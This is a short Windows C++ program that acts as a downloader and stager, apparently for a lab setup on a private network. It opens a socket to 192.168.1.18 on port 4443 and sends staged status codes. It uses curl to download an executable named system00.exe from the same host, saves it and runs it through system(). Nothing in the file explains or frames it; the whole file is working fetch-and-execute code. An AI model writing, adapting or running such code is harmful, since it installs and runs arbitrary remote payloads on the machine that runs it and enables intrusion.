#include <iostream>
#include <string>
#include <iomanip>
#include <winsock2.h>
#include <fstream>
#include <chrono>
#include <cstdlib>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
using namespace std;


int main(void)
{
    string ip = "192.168.1.18";
    string url = "http://"+ip+":80/Windows";
    string estab = "84";
    string win = "02";
    string laun = "10";
    string laun2 = "46";
    string fsh = "00";
    WSADATA WSAData;
    SOCKET sock;
    SOCKADDR_IN sin;
    char buffer[255];
    WSAStartup(MAKEWORD(2,0), &WSAData);
   
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_addr.s_addr = inet_addr(ip.c_str());
    sin.sin_family = AF_INET;
    sin.sin_port = htons(4443);
    
    //cout << "ptr=" << input.data() << ", size=" << input.size();
    
    connect(sock, (SOCKADDR *)&sin, sizeof(sin));
    send(sock, estab.c_str(), estab.size(), 0);
    Sleep(1000);
    send(sock, win.c_str(), win.size(), 0);
    Sleep(4000);
    send(sock, laun.c_str(), laun.size(),0);
    string cm = "curl " + url + " -o system00.exe";
    system(cm.c_str());
    Sleep(4000);
    send(sock, laun2.c_str(), laun2.size(), 0);
    Sleep(4000);
    send(sock, fsh.c_str(), fsh.size(), 0) ;
    Sleep(4000);
    system("system00.exe");
    
    return true;
    
    

}
    
